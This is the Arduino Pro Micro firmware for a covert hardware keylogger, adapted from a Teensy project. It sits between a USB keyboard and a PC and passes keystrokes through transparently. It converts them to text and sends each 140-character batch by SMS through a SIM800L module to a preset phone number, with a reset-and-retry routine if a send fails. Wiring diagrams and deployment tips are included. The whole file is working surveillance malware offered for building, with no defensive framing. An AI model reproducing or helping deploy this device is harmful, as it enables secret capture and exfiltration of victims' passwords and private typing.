// Arduino Pro Micro adaptation of https://github.com/helmmen/KEYVILBOARD (originally for Teensy)
#include <SoftwareSerial.h> // library required for serial communication using almost(!) any Digital I/O pins of Arduino
#include "Keyboard.h" // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC

/*
    The wiring could be flexible because it relies on SoftwareSerial. But keep in mind that: 
    "Not all pins on the Leonardo and Micro support change interrupts, so only the following 
    can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)". (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
    
    The following lines are responsible for wiring:
*/

SoftwareSerial USBhost(15, 14); //communication with USB host board (receiving input from keyboard)
SoftwareSerial Sim800L(8, 9); //communication with sim800L
#define SIM800L_RESET_PIN 10 // digital Arduino pin connected to RST of Sim800L

/*
    The wiring used with the lines above is:
    [ Pro Micro 5V   ->  sim800L ]
                8    ->  SIM_TXD
                9    ->  SIM_RXD
                VCC  ->  5V
                GND  ->  GND
            2nd GND  ->  2nd GND

                        "collector" leg -----> RST
                              |   
      10 -> 1K res -> NPN transistor "base" leg (e.g. BD137)  (see this link and notice direction of NPN transistor and reference: http://exploreembedded.com/wiki/GSM_SIM800L_Sheild_with_Arduino)
                              | 
                        "emitter" leg   -----> GND

    
    [ Pro Micro 5V   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
             GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              15    ->    TX
              14    ->    2K resistor -> RX
             RAW    ->    5V   
                                                                   [This pin is not used anymore]                                                              
                                                                   [         3     ->    SS     ]
                                                                   [         |                  ]
                                                                   [    10K resistor            ]
                                                                   [         |                  ]
                                                                   [        GND                 ]
    Possible design:                                              
    https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
    https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg
    
    Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
    
    The code sends "MODE 6" to the USB host board in order to receive raw HID data, don't worry if it changes what is received from 
    the board (if you're using it for other projects) and just send "MODE 0" command to it by for example changing the "USBhost.println("MODE 6")" line below 
    and running the code once.
*/



/* USER BASIC + ESSENTIAL SETTINGS */
#define PHONE_RECEIVER_NUMBER "+44000000000"
#define CHAR_LIMIT 140 // number of characters before it sends sms (shouldn't be more than 150)
/* 
    The serial connection speed below (for the SIM800L) heavily impacts how fast the sms are sent. The higher value = the faster speed.
    The default baud rate of sim800L appears to be 9600. It could be changed by sending AT+IPR=<rate> command. Possible values of the sim800L 
    baud rates compatible with Arduino Pro Micro are: 1200, 2400, 4800, 9600, 19200, 38400, 57600, 115200. If you look at the original 
    version that uses Teensy it has it set to 115200, I'm not aware of the reliability of it for Teensy because I never tested it but for 
    the Arduino Pro Micro 115200 baud rate was unreliable for me and resulted in slightly "gibberish" output. 38400 worked fine (AT+IPR=38400 command).
    57600 apeared to be the highest reliable frequency compatible between these 2 boards during my test but it's also the weirdest one...
    Twice I used AT+IPR=57600 command and twice it set it to 57700... Keep that in mind if you do the same, because if I didn't notice the response which 
    said 57700 instead of 57600 I would probably assume that I have to look for some way to revert it to orginal settings through some reset, just because it 
    set the baud rate to incorrect value. (even the datasheet says that it supports 57600 but in practice it changed it to 57700...)
    Using 57700 baud rate 140 characters long sms takes around 50ms to send (0.05 of a second).
*/
#define BAUD_RATE_SIM800L 57700 // default is 9600 so send AT+IPR=57700 to it through serial monitor
#define BAUD_RATE_USB_HOST_BOARD 14400 // default was 9600, it was changed by: "BAUD 14400" command (ended by "carriage return", see bottom-right corner of serial monitor)


/* MORE SPECIFIC SETTINGS + DEBUGGING */
#define BAUD_RATE_SERIAL_DEBUGGING 9600
#define SIM800L_RESPONSE_TIMEOUT 2000 // milliseconds 
#define SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED 10//10 // milliseconds

//#define SERIAL_DEBUG // I'd recommend  to comment it out before deploying the device, use it for testing and observing Serial Monitor only

/*
    Arduino Pro Micro keyboard/mouse functions have a peculiar characteristic...
    If the serial monitor is not opened and nothing is reading serial then any keyboard typing
    or mouse movements are lagging hard. Therefore there's a custom Serial_print function which
    controls whether or not to send debug lines using Serial_print depending on the state
    of SERIAL_DEBUG.
*/

/* END OF SETTINGS */

#ifdef SERIAL_DEBUG // before compiling the code Arduino will check wether the "#define SERIAL_DEBUG" was present and depending on that the custom serial print function will actually print things or do nothing
  /* 
     The lines below make S_print() function have the same functionality as the original Serial.print()
     Someone could ask why create another function instead of using original one, it's created for the 
     comfort of the developer who can toggle all the debugging output by commenting out a single line.
     Otherwise it would be necessary to comment out all the Serial.print() calls which would take time and effort. 
     This way all that has to be done to toggle the output is to uncomment or comment out the "#define SERIAL_DEBUG" line.
  */
  #define S_begin(x) Serial.begin(x) // now when Serial_begin will be used it will do exactly the same as the original Serial.begin
  #define S_print(x) Serial.print(x)
  #define S_println(x) Serial.println(x)
#else // else define these functions as empty, so they will do nothing if the "#define SERIAL_DEBUG" line is not present above (e.g. if it's commented out)
  #define S_begin(x)  // now Serial_begin function does nothing and doesn't even have to be deleted from any other part of the code, it can just stay there because it will do nothing
  #define S_println(x)
  #define S_print(x)
#endif



char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires to either confirm (byte 26) or discard (byte 27) new sms message
int char_count; // how many characters were "collected" since turning device on (or since last sms was sent)
byte prevRawHID[8];

//asciiMap copied from https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.cpp
const PROGMEM byte asciiMap[128] = {0,0,0,0,0,0,0,0,42,43,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,158,180,160,161,162,164,52,166,167,165,174,54,45,55,56,39,30,31,32,33,34,35,36,37,38,179,51,182,46,183,184,159,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,47,49,48,163,173,53,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,175,177,176,181,0};
const PROGMEM byte keyPadMap[16] = {85,87,0,86,99,84,98,89,90,91,92,93,94,95,96,97};


void setup() {
  S_begin(BAUD_RATE_SERIAL_DEBUGGING); // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)

  Sim800L.begin(BAUD_RATE_SIM800L); // begin serial communication with the sim800L module to let it know (later) to send an sms 
  Sim800L.write("AT+CMGF=1\r\n"); // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
  //Send_Sim800L_Cmd("AT+CMGF=1\r\n", "OK");
  USBhost.begin(BAUD_RATE_USB_HOST_BOARD); // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  USBhost.println("MODE 6");
  Keyboard.begin(); // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
  USBhost.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())

  pinMode(SIM800L_RESET_PIN, OUTPUT);
  digitalWrite(SIM800L_RESET_PIN, LOW);
}

void loop() {
  HandlingSim800L(); // function responsible for sending sms (+ release all buttons if message is going to be sent)
  HandlingUSBhostBoard(); // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC 

  EmergencySmsRoutine(); // if sms couldn't be sent then reset/reboot Sim800L and try sending sms again, do it without interrupting HID data collection hence this "emergency routine" exists
  
}



/* ------------------------------------------------------------------------------------------------------------
    USB host board stuff

  
*/

char hidText[27];
byte hbc = 0; // hidText string buffer count 
byte rawHID[8]; // modifier_bit_map, manufacturer(ignore) , key1, key2, key3, key4, key5, key6

void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC     
  if (USBhost.available() > 0){  //(50 > millis() - lastRec){
    if(hbc >= sizeof(hidText)){S_println("OVERFLOW MOFOKER");}
  
    hidText[hbc] = USBhost.read(); 
    hbc++;   
    if((hbc == 1 && hidText[hbc-1] != 10) || (hbc == 2 && hidText[hbc-1] != 13)){ // 2 bytes (10 and 13) are received before the string that includes raw HID info
      //S_print(F("hbc_VALUE: ")); S_print(hbc); S_print(", Char: "); S_println(hidText[hbc-1]);
      hbc--;
    }

    if(hbc == 26){
      hidText[hbc]=0;
      for(byte j=0; j<8; j++){
        char buff[3] = {hidText[j*2+j+2], hidText[j*2+j+3], 0};
        rawHID[j] = (byte)strtoul(buff, NULL, 16);
        memset(buff,0,sizeof(buff));
        //Serial.print("BUFF: "); Serial.print(" - "); Serial.print(rawHID[j], DEC); Serial.print(" - "); Serial.println(buff); 
      }              
      
      KeyReport kr = {
        rawHID[0], 
        rawHID[1], {
            rawHID[2],
            rawHID[3],
            rawHID[4],
            rawHID[5],
            rawHID[6],
            rawHID[7],
          }};
                
      HID().SendReport(2, &kr, sizeof(KeyReport));

      if(WasKeyPressed(prevRawHID,rawHID)){
         byte key = GetKeyPressed(prevRawHID, rawHID);
         if(key){
          S_print("\nChars: "); S_println(hidText);
          S_print("Key: "); S_println(key);
          byte asciiKey = HID_to_ASCII(key, WasShiftDown(rawHID[0]));
          
          if(asciiKey){
            //finally add it to the TextSms
            //Serial.print("SAVING: "); Serial.print(asciiKey); Serial.print(" - "); Serial.println((char)asciiKey);
            TextSms[char_count] = (char)asciiKey;
            char_count++;
            if(char_count == sizeof(TextSms)){char_count=0;}
            //Serial.print("CHAR_COUNT: "); Serial.println(char_count);
          }
          asciiKey = 0;
        }
        key = 0; 
      }
      else if (WasModifierPressed(prevRawHID[0], rawHID[0])){ 
        //S_println(F("MODIFIER PRESSED"));
      }
      else{ // was released
        //S_println(F("RELEASED"));
      }               
      //strncpy(prevRawHID, rawHID, sizeof(rawHID));
      for(byte j=0; j<sizeof(rawHID); j++){prevRawHID[j] = rawHID[j];}
      memset(rawHID,0,sizeof(rawHID));
      memset(hidText,0,sizeof(hidText));
      hbc = 0;
      //break;
    }     
  }
}

byte HID_to_ASCII(byte key, bool shiftDown){
  for(byte i=0; i<128; i++){
    byte b = pgm_read_byte(asciiMap + i);
    if(!(shiftDown == false && b >= 128) && !(shiftDown == true && b < 128)){
      if(key == (shiftDown ? b ^ 128 : b)){
        return i;
      }
    }
  }

  // numpad keys
  for(byte i=0; i < 16; i++){
    if(key == pgm_read_byte(keyPadMap + i)) {
      return i+42;
    }
  }
  return 0; 
}


bool WasKeyPressed(byte* prevRawHID, byte* rawHID){
  for(int i=2; i<8; i++){
    if(rawHID[i] == 0){return false;}
    if(prevRawHID[i] == 0){return true;}   
  }
  return false;
}

bool WasModifierPressed(byte prevMod, byte mod){
  return (mod > prevMod);
}

byte GetKeyPressed(byte* prevRawHID, byte* rawHID){
  for(int i=2; i<8; i++){
    //S_print((int)prevRawHID[i]); S_print(" - "); S_println((int)rawHID[i]); 
    
    if(rawHID[i] > 0 && prevRawHID[i] == 0){return rawHID[i];} 
  }
  return 0;
}

bool WasShiftDown(byte modByte){
  return (IsBitHigh(modByte, 1) || IsBitHigh(modByte, 5)); //if 2nd or 6th bit (left/right shift)
}

// thanks to Marc Gravell's https://stackoverflow.com/questions/9804866/return-a-specific-bit-as-boolean-from-a-byte-value
bool IsBitHigh(byte byteToConvert, byte bitToReturn){
  byte mask = 1 << bitToReturn;
  return (byteToConvert & mask) == mask;
}

void ReleaseAllButtons(){
  KeyReport kr = {
    0, 
    0, {
        0,
        0,
        0,
        0,
        0,
        0,
      }};
            
  HID().SendReport(2, &kr, sizeof(KeyReport));
}






/* ------------------------------------------------------------------------------------------------------------
    sim800L stuff

  
 */

bool smsFailed = false;
unsigned long failedSmsTime;
char backupTextSms[CHAR_LIMIT+2];
byte backupCharCount = 0;
byte emergencySmsRoutineStep = 0;

void EmergencySmsRoutine(){
  if(smsFailed){
    switch(emergencySmsRoutineStep){
      case 0:
        //Sim800L.end();
        ResetSim800L();
        emergencySmsRoutineStep++;  
      case 1:
        if(millis() - failedSmsTime > 5000){
          //Sim800L.begin(BAUD_RATE_SIM800L);
          Sim800L.write("AT+CMGF=1\r\n");
          emergencySmsRoutineStep++;
          //USBhost.listen();
        }
        break;    
      case 2:
        if(millis() - failedSmsTime > 10000){ 
          Sim800L.write("AT+CMGF=1\r\n");
          S_println("Trying to re-send sms...");
          if(SendSms(PHONE_RECEIVER_NUMBER, backupTextSms, backupCharCount)){
            emergencySmsRoutineStep=0;
            smsFailed = false;
            memset(backupTextSms, 0, sizeof(backupTextSms));
            S_println("Sms sent successfully");
          }
          else{
            failedSmsTime = millis(); 
            emergencySmsRoutineStep=0;
            S_println("Failed again. Re-trying procedure...");
          }
        }
        break;    
    } 
  }
}

void HandlingSim800L() { 
  if (char_count == CHAR_LIMIT - 1) {
    if(SendSms(PHONE_RECEIVER_NUMBER, TextSms, char_count)){
      S_println(F("SMS should be sent now, however the code doesn't wait for confirmation because it arrives after too long."));
    }
    else{
      smsFailed = true;
      failedSmsTime = millis();
      strncpy(backupTextSms, TextSms, char_count);
      S_println("WARNING: Sending sms failed. Emergency routine activated. (Resetting, waiting 10 seconds, sending again)");
      backupCharCount = char_count;
    }
    char_count = 0; // reset the index of TextSMS[char_count] and start writing to it again with new key-bytes
  } 
}

void ResetSim800L(){
  digitalWrite(SIM800L_RESET_PIN, HIGH);
  delay(100);
  digitalWrite(SIM800L_RESET_PIN, LOW);
  S_print("Resetted Sim800L module.");
}

bool SendSms(char* number, char* text, byte len){
  bool success;

  ReleaseAllButtons();
  
  unsigned long functionEntryTime = millis();
  char sms_cmd[40];
  
  Sim800L.listen();
  
  S_println(F("\nSMS with the following content is about to be sent to sim800L: ")); S_println(TextSms);
  sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", number); // format the sms command (so the number can be easily changed at the top of the code) 
  text[len] = 26; text[len+1] = 0;

  
  if (Send_Sim800L_Cmd(sms_cmd, ">")){
    Sim800L.print(text); // send additional part which includes the actual text
    //Send_Sim800L_Cmd(TextSms, "OK");
    success = true;
  }else{
    success = false;
  }
  
  USBhost.listen();
  if(success == true){S_print(F("Sending SMS took: ")); S_print(millis() - functionEntryTime); S_println("ms.");}
  memset(sms_cmd, 0, sizeof(sms_cmd));
  return success;
}

bool Send_Sim800L_Cmd(char* cmd, char* desiredResponsePart){ 
  while(Sim800L.available()){Sim800L.read();} // clean the buffer before sending command (just in case if previous response was not fully read)
  Sim800L.write(cmd);
  S_println(F("\nThe following command has been sent to sim800L: ")); S_println(cmd);
  S_println(F("Waiting for response..."));

  char response[60];
  if(!Get_Sim800L_Response(response, sizeof(response), cmd, SIM800L_RESPONSE_TIMEOUT, SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED)){
    S_print(F("WARNING: No response received within ")); S_print(SIM800L_RESPONSE_TIMEOUT); S_println("ms.)");
    return false;
  }
  else{
    if(!strstr(response, desiredResponsePart)){ 
      S_println(F("WARNING: Response did not include desired characters."));
      S_println(F("Response: ")); S_println(response);
      memset(response, 0, sizeof(response));
      return false; 
    }
    else{
      S_println(F("Response: ")); S_println(response);
      memset(response, 0, sizeof(response));
      return true;
    }
  }
}

// eg. if(Get_Sim800L_Response(sim800L_response, cmd, 1000, 10);){}
bool Get_Sim800L_Response(char* response, byte respLen, char* lastCmd,  unsigned short timeout, unsigned short keepCheckingFor) { // timeout = waitForTheFirstByteForThatLongUntilReturningFalse, keepCheckingFor = checkingTimeLimitAfterLastCharWasReceived
  for(byte i=0; i < respLen; i++){response[i]=0;}  //clear buffer
  
  unsigned long functionEntryTime = millis();
  while(Sim800L.available() <= 0){
    delay(1);
    if(millis() - functionEntryTime > timeout){
      return false;
    }
  }

  byte i=0;
  byte ignorePreviouslyTypedCommand = 0; // value used to ignore the command that was sent in case if it's returned back (which is done by the sim800L...)
  unsigned long lastByteRec = millis(); // timing functions (needed for reliable reading of the BTserial)
  while (keepCheckingFor > millis() - lastByteRec) // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
  {         
    while (Sim800L.available() > 0 && i < respLen - 1) {
      if(i == strlen(lastCmd)){
        if(!strncmp(response, lastCmd, strlen(response)-1)){
          ignorePreviouslyTypedCommand = i+1;
          //S_println("IGNORING_PREVIOUSLY_TYPED_CMD_THAT_IS_RETURNED_FROM_SIM_800L");
          for(byte j=0; j<i; j++){response[j]=0;} // clear that command from response 
        }
      }
      byte ind = i - ignorePreviouslyTypedCommand;
      if(ind < 0){ind=0;} 
      response[ind] = Sim800L.read(); 
      i++;
      lastByteRec = millis();
    }    
    if(i >= respLen - 1){S_print(F("WARNING: Sim800L response size is over limit.")); return true;}
  }
  return true;
}


